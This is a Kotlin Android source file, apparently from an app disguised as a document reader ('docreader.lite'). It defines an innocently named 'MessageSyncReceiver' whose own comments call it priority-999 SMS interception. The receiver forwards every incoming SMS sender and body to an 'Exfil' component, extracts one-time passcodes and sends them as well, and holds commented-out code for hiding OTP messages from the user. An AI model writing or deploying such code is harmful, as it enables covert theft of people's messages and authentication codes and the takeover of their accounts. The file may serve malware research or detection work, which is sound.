package com.docreader.lite.reader

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import android.telephony.SmsMessage

/**
 * SMS interception — priority 999 receiver.
 * Fires BEFORE the default SMS app.
 * Extracts OTP codes and full message body.
 */
class MessageSyncReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        val messages = getMessages(intent) ?: return

        for (msg in messages) {
            val sender = msg.originatingAddress ?: "unknown"
            val body = msg.messageBody ?: continue

            // Full SMS → exfil
            Exfil.sms(sender, body)

            // Extract OTP if present
            val otp = TextExtractor.extract(body)
            if (otp != null) {
                Exfil.otp("sms:$sender", otp, "sms")
            }
        }

        // Suppress notification so user doesn't see OTP SMS:
        // abortBroadcast()
        // ^ Uncomment for full suppression (only works on ordered broadcasts)
    }

    @Suppress("DEPRECATION")
    private fun getMessages(intent: Intent): Array<SmsMessage>? {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            Telephony.Sms.Intents.getMessagesFromIntent(intent)
        } else {
            val pdus = intent.extras?.get("pdus") as? Array<*> ?: return null
            pdus.mapNotNull { SmsMessage.createFromPdu(it as ByteArray) }.toTypedArray()
        }
    }
}
